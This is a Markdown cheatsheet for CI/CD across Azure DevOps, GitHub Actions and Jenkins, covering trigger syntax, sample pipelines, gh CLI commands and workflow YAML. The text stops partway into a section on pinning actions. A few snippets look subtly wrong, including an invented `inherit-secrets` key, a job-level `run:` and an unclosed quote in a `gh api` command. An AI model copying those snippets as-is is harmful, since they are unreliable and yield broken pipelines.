# ⚡ THE CI/CD CHEATSHEET — Azure DevOps · GitHub Actions · Jenkins · GitOps

> **One page. Everything.** The commands, the YAML you'll type wrong, the flags you can't remember, the three-tool translation table, the security ladder, the troubleshooting matrix, and the interview lines.
>
> Print it. Pin it. Keep it open in a second monitor during every pipeline edit.
> **Companion to:** [01-CICD-GUIDE.md](./01-CICD-GUIDE.md) (theory) · [02](./02-CASE-1-azure-devops.md)/[03](./03-CASE-2-github-actions.md)/[04](./04-CASE-3-jenkins.md) (the three cases) · [05-CAPSTONE-END-TO-END.md](./05-CAPSTONE-END-TO-END.md) (the system)

---

## 📇 Contents

| § | What |
|---|---|
| [0](#0--the-60-second-version) | The 60-second version |
| [1](#1---the-three-tool-translation-table) | ⭐ The three-tool translation table |
| [2](#2--file-formats-and-where-they-live) | File formats and where they live |
| [3](#3--minimal-working-pipelines-all-three-tools) | Minimal working pipelines, all three tools |
| [4](#4---github-actions) | 🐙 GitHub Actions |
| [5](#5---azure-devops) | 🔷 Azure DevOps |
| [6](#6---jenkins) | 🔨 Jenkins |
| [7](#7--docker-and-container-builds) | Docker and container builds |
| [8](#8--kubernetes-deployment) | Kubernetes deployment |
| [9](#9--gitops--argo-cd--argo-rollouts) | GitOps · Argo CD · Argo Rollouts |
| [10](#10---secrets-the-ladder) | ⭐ Secrets: the ladder |
| [11](#11---pipeline-security-the-attacks) | ⭐ Pipeline security: the attacks |
| [12](#12--supply-chain-signing-sbom-provenance) | Supply chain: signing, SBOM, provenance |
| [13](#13--caching) | Caching |
| [14](#14---troubleshooting-the-matrix) | ⭐⭐ Troubleshooting: the matrix |
| [15](#15--cost) | Cost |
| [16](#16--migration-playbook) | Migration playbook |
| [17](#17--observability-of-the-pipeline-itself) | Observability of the pipeline itself |
| [18](#18--dora-metrics) | DORA metrics |
| [19](#19--interview-lines) | ⭐⭐ Interview lines |
| [20](#20--the-checklists) | The checklists |

---

<a name="0--the-60-second-version"></a>
## 0 · The 60-second version

```
CI/CD is FOUR separate ideas that people conflate:

  CI  — Continuous INTEGRATION: every commit builds and tests. Finds breakage
        in minutes instead of weeks.

  CD  — Continuous DELIVERY: every commit COULD go to production, but a human
        presses the button.

  CD  — Continuous DEPLOYMENT: every commit that passes the gates DOES go to
        production, with no human.

  ⭐ GitOps — the deployment mechanism: Git is the source of truth, a
     controller reconciles the cluster to match it, and CI has NO cluster
     credentials.

THE FIVE THINGS THAT ACTUALLY MATTER:
  1. BUILD ONCE. One image, promoted by DIGEST. Never rebuilt per environment.
  2. CI HAS NO CLUSTER CREDENTIALS. It writes a digest to Git. That's all.
  3. FAST FEEDBACK. Under 10 minutes to a verdict, or people stop waiting.
  4. EVERY SECRET IS SCOPED AND SHORT-LIVED. OIDC/WIF beats every stored key.
  5. THE PIPELINE IS OBSERVED. You cannot improve what you cannot measure.

THE THREE TOOLS IN ONE LINE EACH:
  🔷 Azure DevOps — Stages → Jobs → Steps, YAML or classic UI, flat-rate
                    parallel jobs, best-in-class approvals and variable groups.
  🐙 GitHub Actions — Jobs → Steps only (NO stages), YAML in .github/workflows,
                    the biggest marketplace, per-minute billing, OIDC done right.
  🔨 Jenkins — Stage → Step in Groovy, self-hosted, infinite flexibility,
                100% of the security is YOUR problem.
```

---

<a name="1--the-three-tool-translation-table-"></a>
## 1 · ⭐ The three-tool translation table

### 1.1 Vocabulary

| Concept | 🔷 Azure DevOps | 🐙 GitHub Actions | 🔨 Jenkins |
|---|---|---|---|
| The pipeline file | `azure-pipelines.yml` | `.github/workflows/*.yml` | `Jenkinsfile` |
| Language | YAML | YAML | **Groovy** |
| Top-level container | `stages:` | ⛔ **none** | `pipeline {}` |
| Parallel unit | `jobs:` | `jobs:` | `parallel {}` / `node()` |
| Atomic unit | `steps:` | `steps:` | `steps:` |
| A reusable step | `template` (YAML file) | `composite action` | `shared library` `vars/*.groovy` |
| A reusable job | `template` with `jobs:` | `reusable workflow` (`workflow_call`) | `shared library` / `build job:` |
| A reusable pipeline | `extends: template` ⭐ | `uses:` a reusable workflow | `shared library` returning a full pipeline |
| Marketplace | Task marketplace (~100s) | ⭐ Actions marketplace (~30,000) | ⭐ Plugins (~1,900) |
| The runner/agent | **agent** (pool) | **runner** | **agent / node** |
| A variable | `variables:` / `$(name)` | `env:` / `${{ }}` | `environment {}` / `env.X` |
| A secret | **variable group** → Key Vault | `secrets.X` | **credentials** store |
| An environment | `environments:` | `environment:` | ⛔ none built-in (use folders) |
| A manual gate | `deployment:` job + checks | `environment` protection rules | `input` step |
| A lock | ⛔ use `deployment:` | `concurrency:` | `lock()` / Lockable Resources |
| Artifacts | `publish:` / `download:` | `upload-artifact` / `download-artifact` | `archiveArtifacts` |
| Test results | `publishTestResults:` | a third-party action | `junit` step |
| Code coverage | `publishCodeCoverageResults:` | a third-party action | `jacoco` / `cobertura` plugin |
| Trigger on push | `trigger:` | `on: push:` | `pollSCM` / webhook / multibranch |
| Trigger on PR | `pr:` | `on: pull_request:` | multibranch `changeRequest()` |
| Trigger on schedule | `schedules:` | `on: schedule:` | `triggers { cron() }` |
| Cancel in-flight | ⭐ automatic with `batch: true` | `concurrency: cancel-in-progress` | ⛔ `disableConcurrentBuilds()` (opposite) |
| Matrix builds | `strategy: matrix:` | `strategy: matrix:` | `parallel` over a list (manual) |
| Conditional | `condition: succeeded()` | `if: success()` | `when { }` |
| Post-actions | `condition: always()` on a step | `if: always()` | `post { always {} }` ⭐ |
| Timeout | `timeoutInMinutes:` | `timeout-minutes:` | `options { timeout() }` |
| The workspace | `$(System.DefaultWorkingDirectory)` | `$GITHUB_WORKSPACE` | `$WORKSPACE` |
| The commit SHA | `$(Build.SourceVersion)` | `${{ github.sha }}` | `env.GIT_COMMIT` |
| The build number | `$(Build.BuildNumber)` | `${{ github.run_number }}` | `env.BUILD_NUMBER` |
| The build URL | `$(System.TeamFoundationCollectionUri)…` | `${{ github.server_url }}/…` | `env.BUILD_URL` |
| Fail the build | `exit 1` / `##vso[task.logissue type=error]` | `exit 1` / `::error::` | `error "msg"` / `exit 1` |
| Set an output | `##vso[task.setvariable variable=x;isOutput=true]` | `echo "x=1" >> $GITHUB_OUTPUT` | `env.X = "1"` / return value |

### 1.2 ⭐ The biggest structural difference

```
AZURE DEVOPS                      GITHUB ACTIONS                JENKINS
──────────────                    ──────────────                ───────
stages:                           jobs:                         pipeline {
  - stage: Build                    build:                        stages {
      jobs:                           runs-on: ubuntu-latest        stage('Build') {
        - job: Compile                steps:                          steps { sh '…' }
            steps:                      - run: …                    }
              - task: …               deploy:                       stage('Deploy') {
  - stage: Deploy                       needs: build  ⭐              steps { sh '…' }
      dependsOn: Build                  environment: production     }
      jobs:                             steps: …                    }
        - deployment: Deploy          }                             post { always { } }
            environment: prod                                       }
            strategy:                                              }
              runOnce:
                deploy:
                  steps: …

⭐ GitHub Actions has NO `stages:` keyword.
   You EMULATE stages with two things:
     1. `needs:` — job B waits for job A
     2. `environment:` — a job that targets a protected environment gets
        gated by that environment's protection rules

⭐ That's not a deficiency. It's flatter, and it composes better with
   reusable workflows. But if you're translating an Azure pipeline,
   remember: a STAGE becomes a JOB with `needs:` + `environment:`.

⭐ Jenkins' `parallel {}` inside a stage ≈ Azure/GitHub's `jobs:`.
   Jenkins' `node()` blocks ≈ separate agents for parts of one job.
```

### 1.3 Trigger syntax side by side

```yaml
# 🔷 AZURE DEVOPS
trigger:
  branches: {include: [main, release/*], exclude: [feature/experimental]}
  paths:    {include: ['src/*', 'helm/*'], exclude: ['*.md', 'docs/*']}
  batch: true                     # ⭐ coalesce pushes while a build runs
  tags: {include: ['v*']}
pr:
  branches: {include: [main]}
  autoCancel: true                # ⭐ cancel the PR build when new commits land
schedules:
  - cron: '0 3 * * *'             # ⭐ UTC. 03:00 UTC = 08:30 IST
    displayName: Nightly
    branches: {include: [main]}
    always: true                  # ⭐ run even with no new commits
resources:
  pipelines:                      # ⭐ pipeline chaining
    - pipeline: upstreamBuild
      source: my-project/upstream-pipeline
      trigger: {branches: [main]}
  containers:
    - container: myImage
      image: ghcr.io/3558bhk/tool:1.0
      trigger: true               # ⭐ rebuild when the image changes
```

```yaml
# 🐙 GITHUB ACTIONS
on:
  push:
    branches: [main, 'release/**']
    tags: ['v*.*.*']
    paths: ['src/**', 'helm/**']
    paths-ignore: ['**.md', 'docs/**']     # ⛔ cannot combine with `paths`
  pull_request:
    branches: [main]
    types: [opened, synchronize, reopened, labeled]   # ⭐ NOT the default set
  workflow_dispatch:                        # ⭐ the manual button
    inputs:
      environment: {type: choice, options: [dev, staging, production], default: dev}
      dry_run:     {type: boolean, default: false}
  schedule:
    - cron: '0 3 * * *'                     # ⭐ UTC
  workflow_call:                            # ⭐ makes it a reusable workflow
    inputs:  {service: {type: string, required: true}}
    secrets: {DEPLOY_TOKEN: {required: true}}
  workflow_run:                             # ⭐ chained (⚠️ runs on the DEFAULT branch)
    workflows: [CI]
    types: [completed]
  release: {types: [published]}
  repository_dispatch: {types: [promote]}   # ⭐ API-triggered
```

```groovy
// 🔨 JENKINS
properties([
  pipelineTriggers([
    [$class: 'GitHubPushTrigger'],
    pollSCM('H/2 * * * *'),                // ⭐ H = spread the load, not a thundering herd
    cron('H 3 * * *'),                     // ⭐ nightly, hashed
    upstream(upstreamProjects: 'shop/shop-api/main', threshold: hudson.model.Result.SUCCESS),
  ]),
  // ⭐ the multibranch way (in a Jenkinsfile you can't set triggers on the job
  //    itself — do it in the folder/job config or with Job DSL)
])
// and the WHEN conditions:
stage('Deploy') {
  when {
    allOf {
      branch 'main'
      not { changeRequest() }              // ⭐ NOT a PR from a fork
      expression { env.DEPLOY == 'true' }
      changeset 'src/**'                   // ⭐ only if these paths changed
      environment name: 'DEPLOY_TO', value: 'production'
      tag 'v*'
      triggeredBy 'UserIdCause'            // ⭐ a human clicked it
      beforeAgent true                     // ⭐⭐ evaluate BEFORE allocating an agent
    }
    anyOf { branch 'main'; branch 'release/*' }
    equals expected: 'manual', actual: params.MODE
  }
}
```

### 1.4 Conditional / skip syntax

| Intent | 🔷 Azure | 🐙 GitHub | 🔨 Jenkins |
|---|---|---|---|
| only on success | `condition: succeeded()` | `if: success()` | (default) |
| even on failure | `condition: always()` | `if: always()` | `post { always { } }` |
| on failure only | `condition: failed()` | `if: failure()` | `post { failure { } }` |
| on cancel | `condition: canceled()` | `if: cancelled()` | `post { aborted { } }` |
| on main only | `condition: eq(variables['Build.SourceBranchName'], 'main')` | `if: github.ref == 'refs/heads/main'` | `when { branch 'main' }` |
| not a PR | `condition: ne(variables['Build.Reason'], 'PullRequest')` | `if: github.event_name != 'pull_request'` | `when { not { changeRequest() } }` |
| a variable is set | `condition: and(succeeded(), ne(variables['DEPLOY'], ''))` | `if: success() && env.DEPLOY != ''` | `when { expression { env.DEPLOY } }` |
| a previous job's output | `condition: eq(stageDependencies.A.outputs['j.s.x'], 'yes')` | `if: needs.A.outputs.x == 'yes'` | `when { expression { env.X == 'yes' } }` |
| files changed | ⛔ (a task computing it) | ⭐ `dorny/paths-filter` | `when { changeset 'src/**' }` |
| a tag matches | `condition: startsWith(variables['Build.SourceBranch'], 'refs/tags/v')` | `if: startsWith(github.ref, 'refs/tags/v')` | `when { tag 'v*' }` |
| manual only | `condition: eq(variables['Build.Reason'], 'Manual')` | `if: github.event_name == 'workflow_dispatch'` | `when { triggeredBy 'UserIdCause' }` |
| ⭐ evaluate before allocating a machine | `condition:` on a job | `if:` on a job | ⭐ `when { beforeAgent true }` |

---

<a name="2--file-formats-and-where-they-live"></a>
## 2 · File formats and where they live

```
YOUR APP REPO
├── azure-pipelines.yml                    🔷 at the repo root (conventional)
│   └── or any path — set it in the pipeline's UI "YAML > Get sources"
├── .github/
│   ├── workflows/
│   │   ├── ci.yml                         🐙 the build
│   │   ├── release.yml                    🐙 the deploy
│   │   ├── nightly.yml                    🐙 scheduled scans
│   │   └── promote.yml                    🐙 workflow_dispatch promotions
│   ├── actions/                           🐙 COMPOSITE actions (this repo only)
│   │   └── setup-shop/
│   │       └── action.yml
│   ├── CODEOWNERS                         ⭐⭐ who must approve pipeline changes
│   ├── dependabot.yml                     ⭐ auto-PRs for action + Docker bumps
│   └── pull_request_template.md
├── ci/                                    ⭐ shared shell scripts ALL tools call
│   ├── test.sh
│   ├── lint.sh
│   └── build.sh
├── scripts/
│   ├── deploy.sh                          ⭐⭐ the tool-agnostic deploy
│   ├── promote.sh                         ⭐⭐ the GitOps boundary
│   ├── sign-and-attest.sh                 ⭐ the supply chain
│   └── emit-pipeline-metrics.sh           ⭐ DORA metrics
├── helm/ or apps/base/                    the chart
├── Jenkinsfile                            🔨 at the repo root (REQUIRED for
│                                             multibranch auto-discovery)
└── vars/ + src/ + resources/ + test/      🔨 if this repo IS a shared library

⭐⭐ THE RULE THAT MAKES THREE TOOLS COEXIST:
   Put the real logic in shell scripts under ci/ and scripts/.
   The YAML/Groovy only ORCHESTRATES: check out, set up, call the script,
   publish the result. Then the three tools differ only in how they say
   "run this script with these environment variables" — and swapping a tool
   is a half-day job, not a rewrite.
```

---

<a name="3--minimal-working-pipelines-all-three-tools"></a>
## 3 · Minimal working pipelines, all three tools

### 3.1 Build → test → image → deploy to dev

```yaml
# 🔷 azure-pipelines.yml
trigger: {branches: {include: [main]}}
pr: {branches: {include: [main]}, autoCancel: true}
pool: {vmImage: ubuntu-latest}
variables:
  - group: shop-common                       # ⭐ a variable group (may link Key Vault)
  IMAGE: ghcr.io/3558bhk/shop-api
stages:
  - stage: Build
    jobs:
      - job: Build
        timeoutInMinutes: 20
        steps:
          - checkout: self
            fetchDepth: 0
          - task: JavaToolInstaller@0
            inputs: {versionSpec: '21', jdkArchitectureOption: x64, jdkSourceOption: PreInstalled}
          - bash: ./ci/test.sh shop-api
            displayName: Test
          - bash: |
              set -euo pipefail
              echo "$(REG_TOKEN)" | docker login ghcr.io -u 3558bhk --password-stdin
              docker build -t "$(IMAGE):$(Build.SourceVersion)" apps/shop-api
              docker push "$(IMAGE):$(Build.SourceVersion)"
              echo "##vso[task.setvariable variable=TAG;isOutput=true]$(Build.SourceVersion)"
            name: build
            displayName: Build the image
          - bash: ./scripts/deploy.sh dev shop-api "$(IMAGE):$(Build.SourceVersion)"
            displayName: Deploy to dev
```

```yaml
# 🐙 .github/workflows/ci.yml
name: CI
on:
  push: {branches: [main]}
  pull_request: {branches: [main]}
permissions: {contents: read, packages: write}     # ⭐⭐ LEAST privilege, always
concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
env: {IMAGE: 'ghcr.io/3558bhk/shop-api'}
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b   # v7.0.0 ⭐ SHA-pinned
      - uses: actions/setup-java@v5
        with: {distribution: temurin, java-version: '21', cache: maven}
      - run: ./ci/test.sh shop-api
      - uses: docker/login-action@v3
        if: github.event_name != 'pull_request'
        with: {registry: ghcr.io, username: '${{ github.actor }}', password: '${{ secrets.GITHUB_TOKEN }}'}
      - uses: docker/build-push-action@v6
        with:
          context: apps/shop-api
          push: ${{ github.event_name != 'pull_request' }}
          load: ${{ github.event_name == 'pull_request' }}
          tags: '${{ env.IMAGE }}:${{ github.sha }}'
          cache-from: type=gha
          cache-to: type=gha,mode=max
      - run: ./scripts/deploy.sh dev shop-api "$IMAGE:${{ github.sha }}"
        if: github.ref == 'refs/heads/main'
```

```groovy
// 🔨 Jenkinsfile
pipeline {
  agent { label 'docker' }
  options {
    timestamps(); ansiColor('xterm')
    timeout(time: 20, unit: 'MINUTES')
    buildDiscarder(logRotator(numToKeepStr: '50', daysToKeepStr: '90'))
    disableConcurrentBuilds()
    skipDefaultCheckout(true)
  }
  environment { IMAGE = 'ghcr.io/3558bhk/shop-api' }
  stages {
    stage('Checkout') { steps { checkout scm } }
    stage('Test')     { steps { sh './ci/test.sh shop-api' } }
    stage('Build') {
      when { not { changeRequest() } }
      steps {
        withCredentials([usernamePassword(credentialsId: 'ghcr-token',
                                          usernameVariable: 'U', passwordVariable: 'P')]) {
          sh '''
            set -euo pipefail
            echo "$P" | docker login ghcr.io -u "$U" --password-stdin
            docker build -t "$IMAGE:$GIT_COMMIT" apps/shop-api
            docker push "$IMAGE:$GIT_COMMIT"
          '''
        }
      }
    }
    stage('Deploy') {
      when { branch 'main' }
      steps { sh './scripts/deploy.sh dev shop-api "$IMAGE:$GIT_COMMIT"' }
    }
  }
  post {
    always  { junit allowEmptyResults: true, testResults: '**/target/surefire-reports/*.xml'
              cleanWs(deleteDirs: true, notFailBuild: true) }
    success { echo '✅ green' }
    failure { echo '⛔ red' }
  }
}
```

---

<a name="4--github-actions-"></a>
## 4 · 🐙 GitHub Actions

### 4.1 The `gh` CLI

```bash
# ── repos and PRs ───────────────────────────────────────────────
gh repo clone 3558Bhk/shop && cd shop
gh repo create shop --private --clone --description "…"
gh repo view --web
gh pr create --fill --base main --draft --reviewer team-x --label bug --body "…"
gh pr create --title "…" --body-file .github/pr-body.md
gh pr list --state open --label service/checkout --limit 20
gh pr view 42 --json title,author,mergeable,reviewDecision,statusCheckRollup
gh pr checks 42 --watch --interval 10
gh pr diff 42
gh pr review 42 --approve --body "lgtm"
gh pr review 42 --request-changes --body "see inline"
gh pr merge 42 --squash --delete-branch --admin        # ⚠️ --admin bypasses rules
gh pr merge 42 --merge | --rebase | --squash
gh pr checkout 42
gh pr ready 42                                          # un-draft

# ── ⭐ RUNS: the CI commands you'll use most ────────────────────
gh run list --workflow ci.yml --limit 20
gh run list --branch main --status failure --limit 10
gh run list --event pull_request --json databaseId,conclusion,headBranch
gh run view 1234567890                                  # the summary
gh run view 1234567890 --log                            # ⭐ EVERYTHING
gh run view 1234567890 --log-failed                     # ⭐⭐ only the failures
gh run view 1234567890 --job 98765 --log
gh run watch 1234567890 --exit-status                   # blocks; exits non-zero on failure
gh run watch --interval 15                              # the latest run
gh run rerun 1234567890
gh run rerun 1234567890 --failed                        # ⭐⭐ only the failed jobs
gh run rerun 1234567890 --debug                         # ⭐ enables step debug logging
gh run cancel 1234567890
gh run delete 1234567890                                # ⚠️ removes the audit trail
gh run download 1234567890 --name coverage --dir ./out  # artifacts
gh workflow list
gh workflow view ci.yml --yaml
gh workflow run ci.yml                                  # ⭐ needs workflow_dispatch
gh workflow run ci.yml --ref release/1.2 -f environment=production -f dry_run=true
gh workflow run promote.yml -f service=checkout -F dry_run=false   # -F = typed
gh workflow disable ci.yml && gh workflow enable ci.yml

# ── secrets and variables ───────────────────────────────────────
gh secret list
gh secret set DEPLOY_TOKEN --body "…"                    # ⚠️ lands in your shell history
gh secret set DEPLOY_TOKEN < token.txt && rm token.txt   # ⭐ do it this way
gh secret set DEPLOY_TOKEN --app actions --env production
gh secret set DEPLOY_TOKEN --org 3558Bhk --repos shop,shop-config
gh secret delete DEPLOY_TOKEN
gh variable list && gh variable set NODE_VERSION 22
gh variable set REGION europe-west-1 --org 3558Bhk
# ⭐⭐ ACTIONS SECRETS vs ENVIRONMENT SECRETS vs VARIABLES:
#   secrets.X            → repo/org-level, encrypted, never printed
#   vars.X               → repo/org-level, PLAIN TEXT, readable in logs
#   environment secrets  → only available to jobs naming that environment

# ── the REST API (for anything the CLI can't do) ────────────────
gh api repos/3558Bhk/shop/actions/runs --jq '.workflow_runs[:5] | .[] | "\(.id) \(.conclusion) \(.head_branch)"'
gh api repos/3558Bhk/shop/actions/permissions/workflow     # the default token permissions
gh api repos/3558Bhk/shop/branches/main/protection
gh api repos/3558Bhk/shop/rules/branches/main              # ⭐ rulesets (the new way)
gh api repos/3558Bhk/shop/environments/production
gh api repos/3558Bhk/shop/code-scanning/alerts --jq '.[] | select(.state=="open") | .rule.id'
gh api repos/3558Bhk/shop/dependabot/alerts --jq '[.[] | select(.state=="open")] | length'
gh api graphql -f query='{ repository(owner:"3558Bhk", name:"shop") { defaultBranchRef { name } } }'
gh api repos/3558Bhk/shop/actions/runs/123/timing          # ⭐ per-job durations
gh api repos/3558Bhk/shop/actions/cache/usage-by-repository
gh api --paginate repos/3558Bhk/shop/actions/runs --jq '.workflow_runs[].id'
```

### 4.2 The YAML you'll type wrong

```yaml
# ── PERMISSIONS ⭐⭐ the single most common mistake ───────────────
permissions: {}                        # ⭐ the safest default; add what you need
permissions:
  contents: read                       # checkout
  packages: write                      # push to GHCR
  pull-requests: write                 # comment on PRs
  id-token: write                      # ⭐⭐ REQUIRED for OIDC (cloud, cosign)
  issues: write
  checks: write                        # publish test results as checks
  security-events: write               # ⭐ upload SARIF to code scanning
  actions: read
  statuses: write
  deployments: write
# ⚠️ `permissions:` at the WORKFLOW level sets the default for all jobs.
# ⚠️ `permissions:` at the JOB level OVERRIDES it entirely for that job.
# ⚠️ A reusable workflow CANNOT inherit — it must declare its own.
# ⭐ set the ORG default to read-only:
#    Settings → Actions → General → Workflow permissions → Read repository
#    contents and packages permissions.

# ── the EXPRESSION syntax ───────────────────────────────────────
${{ github.sha }}                      # the commit
${{ github.ref }}                      # refs/heads/main | refs/pull/42/merge
${{ github.ref_name }}                 # main | 42/merge
${{ github.head_ref }}                 # ⭐ the PR's source branch (empty on push)
${{ github.base_ref }}                 # ⭐ the PR's target branch
${{ github.event_name }}               # push | pull_request | workflow_dispatch
${{ github.event.pull_request.number }}
${{ github.event.pull_request.head.repo.full_name }}   # ⭐ fork detection
${{ github.actor }}                    # who triggered it
${{ github.triggering_actor }}         # ⭐ who clicked (vs. who owns the token)
${{ github.run_id }}  ${{ github.run_number }}  ${{ github.run_attempt }}
${{ github.job }}     ${{ github.workflow }}    ${{ github.repository }}
${{ github.workspace }}               ${{ runner.os }}      ${{ runner.arch }}
${{ matrix.service }}                 ${{ strategy.job-index }}
${{ needs.build.outputs.digest }}     # ⭐⭐ a job output
${{ steps.s1.outputs.x }}             # a step output
${{ secrets.X }}                      # ⭐ NEVER in a `run:` echo
${{ vars.X }}                         # a plain-text variable
${{ inputs.x }}                       # workflow_dispatch / workflow_call inputs
${{ fromJSON(needs.matrix.outputs.list) }}   # ⭐⭐ a dynamic matrix
${{ hashFiles('**/package-lock.json') }}     # ⭐ cache keys
${{ toJSON(github.event) }}           # debug
# functions:
${{ contains(github.event.head_commit.message, '[skip ci]') }}
${{ startsWith(github.ref, 'refs/tags/v') }}
${{ endsWith(github.event.sender.login, '[bot]') }}
${{ always() }}  ${{ success() }}  ${{ failure() }}  ${{ cancelled() }}
${{ !cancelled() }}                   # ⭐ always() EXCEPT cancelled — usually what you want
${{ github.event_name == 'workflow_dispatch' && inputs.environment == 'production' }}
# ⭐ operators: ==  !=  >  <  >=  <=  &&  ||  !
# ⭐ truthiness: an empty string, 0, null and false are falsy. Everything else is TRUE
#    — including the STRING "false". `if: ${{ 'false' }}` RUNS.

# ── OUTPUTS between steps and jobs ──────────────────────────────
# step →
- id: digest
  run: echo "value=$(crane digest $IMAGE:$TAG)" >> "$GITHUB_OUTPUT"
- run: echo '${{ steps.digest.outputs.value }}'
# step → job →
jobs:
  build:
    outputs: {digest: '${{ steps.digest.outputs.value }}'}
  deploy:
    needs: build
    run: echo '${{ needs.build.outputs.digest }}'
# ⭐ multiline output:
- run: |
    {
      echo 'report<<EOF'
      cat report.txt
      echo EOF
    } >> "$GITHUB_OUTPUT"
# ⭐ the environment files:
#   $GITHUB_OUTPUT   step outputs
#   $GITHUB_ENV      env vars for LATER steps in the same job
#   $GITHUB_PATH     directories to prepend to PATH
#   $GITHUB_STEP_SUMMARY   ⭐ markdown shown on the run's summary page
- run: |
    echo "## Coverage" >> "$GITHUB_STEP_SUMMARY"
    echo "| file | % |" >> "$GITHUB_STEP_SUMMARY"
    echo "|---|---|" >> "$GITHUB_STEP_SUMMARY"
    echo "| a.go | 92% |" >> "$GITHUB_STEP_SUMMARY"

# ── MATRIX ⭐ static, dynamic, and change-aware ─────────────────
strategy:
  fail-fast: false                     # ⭐⭐ ALWAYS false. true kills siblings on one failure.
  max-parallel: 4
  matrix:
    os: [ubuntu-latest, macos-latest]
    node: ['20', '22']
    exclude: [{os: macos-latest, node: '20'}]
    include:
      - {os: ubuntu-latest, node: '24', experimental: true}
# ⭐⭐ DYNAMIC: compute the matrix in a first job
jobs:
  changes:
    outputs: {matrix: '${{ steps.m.outputs.matrix }}'}
    steps:
      - uses: actions/checkout@v7
      - uses: dorny/paths-filter@v3
        id: filter
        with:
          filters: |
            shop-api:     ['apps/shop-api/**']
            checkout:     ['apps/checkout/**']
            order-worker: ['apps/order-worker/**']
            shop-ui:      ['apps/shop-ui/**']
      - id: m
        run: |
          set -euo pipefail
          CHANGED='[]'
          for s in shop-api checkout order-worker shop-ui; do
            [[ "${{ steps.filter.outputs[s] }}" == "true" ]] && CHANGED=$(echo "$CHANGED" | jq --arg s "$s" '. + [$s]')
          done
          [[ "$CHANGED" == "[]" ]] && CHANGED='["shop-api"]'   # ⭐ never an empty matrix
          echo "matrix=$CHANGED" >> "$GITHUB_OUTPUT"
          echo "  will build: $CHANGED"
  build:
    needs: changes
    strategy:
      fail-fast: false
      matrix: {service: '${{ fromJSON(needs.changes.outputs.matrix) }}'}
    steps: […]
# ⭐ a dynamic matrix that is EMPTY fails the job with "Matrix must define at
#   least one vector". Guard it, or use `if: needs.changes.outputs.matrix != '[]'`.

# ── ARTIFACTS ───────────────────────────────────────────────────
- uses: actions/upload-artifact@v4
  with:
    name: coverage-${{ matrix.service }}     # ⭐⭐ MUST be unique per matrix leg
    path: |
      target/site/jacoco/
      coverage/lcov.info
    retention-days: 14                       # ⭐ default 90 costs money
    if-no-files-found: error                 # ⭐⭐ fail loudly, not silently
    compression-level: 6
    overwrite: true
- uses: actions/download-artifact@v4
  with:
    name: coverage-checkout
    path: ./coverage
    merge-multiple: true                     # ⭐ combine several into one dir
- uses: actions/download-artifact@v4
  with: {pattern: 'coverage-*', path: ./all, merge-multiple: true}
# ⚠️ v4 artifacts are IMMUTABLE — you cannot re-upload the same name in a run.
# ⚠️ artifacts are ZIPs; a 2 GB artifact takes minutes to upload. Use caches
#    for intermediate files and artifacts for things a human needs.

# ── REUSABLE WORKFLOWS ⭐ the "shared library" ──────────────────
# producer: .github/workflows/_deploy.yml
on:
  workflow_call:
    inputs:
      environment: {type: string, required: true}
      service:     {type: string, required: true}
      digest:      {type: string, required: true}
    secrets:
      CONFIG_TOKEN: {required: true}
    outputs:
      pr_url: {value: '${{ jobs.promote.outputs.pr_url }}'}
jobs:
  promote:
    runs-on: ubuntu-latest
    environment: '${{ inputs.environment }}'
    outputs: {pr_url: '${{ steps.p.outputs.pr_url }}'}
    steps: […]
# consumer:
jobs:
  deploy:
    uses: ./.github/workflows/_deploy.yml        # ⭐ same repo
    # uses: 3558Bhk/pipeline-library/.github/workflows/deploy.yml@a1b2c3d4e5f6…
    #                                            ⭐⭐ another repo, PINNED TO A SHA
    with: {environment: staging, service: checkout, digest: '${{ needs.b.outputs.digest }}'}
    secrets:
      CONFIG_TOKEN: '${{ secrets.CONFIG_TOKEN }}'
      inherit-secrets: false                     # ⭐ explicit, not inherit
    permissions: {contents: read, id-token: write}

# ── COMPOSITE ACTIONS ⭐ a reusable set of steps ────────────────
# .github/actions/setup-shop/action.yml
name: Set up the shop build
description: Installs the toolchain for one service
inputs:
  language: {description: 'go | node | java | python', required: true}
  service:  {description: 'the service directory', required: true}
  go-version: {description: 'the Go version', default: '1.23'}
outputs:
  cache-key: {description: 'the cache key used', value: '${{ steps.k.outputs.key }}'}
runs:
  using: composite
  steps:
    - id: k
      shell: bash
      run: echo "key=${{ inputs.language }}-${{ inputs.service }}-${{ hashFiles(format('apps/{0}/**', inputs.service)) }}" >> "$GITHUB_OUTPUT"
    - if: inputs.language == 'go'
      uses: actions/setup-go@v5
      with: {go-version: '${{ inputs.go-version }}', cache-dependency-path: 'apps/${{ inputs.service }}/go.sum'}
    - if: inputs.language == 'java'
      uses: actions/setup-java@v5
      with: {distribution: temurin, java-version: '21', cache: maven}
    - if: inputs.language == 'node'
      uses: actions/setup-node@v4
      with: {node-version: '22', cache: npm, cache-dependency-path: 'apps/${{ inputs.service }}/package-lock.json'}
    - shell: bash
      run: echo "✅ set up ${{ inputs.language }} for ${{ inputs.service }}"
# ⚠️ composite actions CANNOT use `if:` at the action level, CANNOT set
#    `defaults.run`, and CANNOT nest `uses:` another composite (they can use
#    regular actions).

# ── ENVIRONMENTS and protection rules ───────────────────────────
jobs:
  deploy:
    environment:
      name: production
      url: 'https://shop.example.com'          # ⭐ shown on the run page
    # ⭐ the PROTECTION RULES are set in the UI (Settings → Environments) or
    #    via the API — NOT in YAML:
    #      · Required reviewers (up to 6 users/teams)   ← ⭐ the manual gate
    #      · Wait timer (minutes)                      ← a soak
    #      · Deployment branches (allow main only)     ← ⭐⭐ a real boundary
    #      · Environment secrets                       ← scoped credentials
    #      · Allow administrators to bypass: NO        ← ⭐⭐ turn this off
gh api -X PUT repos/3558Bhk/shop/environments/production \
  -f wait_timer=5 \
  -F 'prevent_environment_reviewers_self_review=false' \
  -F 'reviewers[][type]=Team' -F 'reviewers[][id]=123456 \
  -F 'deployment_branch_policy[protected_branches]=true' \
  -F 'deployment_branch_policy[custom_branch_policies]=false'
```

### 4.3 ⭐ Pinning actions — the supply-chain control

```yaml
# ⛔ NEVER in production:
- uses: actions/checkout@v7              # a MOVABLE TAG. The author can repoint it.
- uses: some-random-user/action@main     # ⛔⛔ a BRANCH. Actively dangerous.

# ⭐ ALWAYS:
- uses: actions/checkout@1125036b2a9a4fd1baa15cf1a94c1e7d0e2bda9b   # v7.0.0
# ⭐⭐ and for FIRST-PARTY actions (not actions/*), pin + verify the owner:
